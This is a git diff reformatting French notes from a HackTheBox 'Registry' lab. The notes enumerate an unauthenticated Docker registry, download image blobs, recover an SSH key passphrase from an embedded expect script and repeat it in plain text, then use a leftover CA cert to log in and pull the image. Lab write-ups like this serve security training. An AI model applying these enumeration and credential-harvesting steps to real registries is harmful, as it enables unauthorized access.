@@ -1,6 +1,8 @@
-### private registry
-liste des repo:
+# docker private registry
 
+## lister les repo:
+
+```
 http://docker.registry.htb/v2/_catalog
 
 {"repositories":["bolt-image"]}
@@ -47,18 +49,20 @@ http://docker.registry.htb/v2/bolt-image/manifests/latest
    }
 ],
 """"
+```
+### on télécharge les blobs:
 
-on télécharge les blobs:
-
+```
 http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b
-
+```
 etc....
 
 
-================
-dézipage des blobs...
-findings:
+## dézipage des blobs...
 
+## findings:
+
+```bash
 #!/usr/bin/expect -f
 #eval `ssh-agent -s`
 spawn ssh-add /root/.ssh/id_rsa
@@ -66,15 +70,16 @@ expect "Enter passphrase for /root/.ssh/id_rsa:"
 send "GkOcz221Ftb3ugog\n";
 expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
 interact
+```
 
-===========================
-passphrase clé ssh: GkOcz221Ftb3ugog
+### passphrase clé ssh: GkOcz221Ftb3ugog
 
-
+```bash
 ./sha256_c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7 (1)/root/.bash_history:39:ssh-keygen -t rsa -b 4096 -C "bolt@registry.htb"
+```
+### utilisation du certificats client qui traine:
 
-#utilisation du certificats client qui traine:
-
+```bash
 michael@k:~/Documents/Projets/01HackTheBox/Registry$ sudo mkdir /etc/docker/certs.d/docker.registry.htb
 michael@k:~/Documents/Projets/01HackTheBox/Registry$ mv /etc/docker/certs.d/ca.crt /etc/docker/certs.d/docker.registry.htb/
 mv: impossible de déplacer '/etc/docker/certs.d/ca.crt' vers '/etc/docker/certs.d/docker.registry.htb/ca.crt': Permission non accordée
@@ -88,9 +93,10 @@ Configure a credential helper to remove this warning. See
 https://docs.docker.com/engine/reference/commandline/login/#credentials-store
 
 Login Succeeded
+```
 
-==============================
-téléchargment du container:
+## téléchargment du container:
+
+```bash
 sudo docker pull docker.registry.htb/bolt-image
-
-
+```
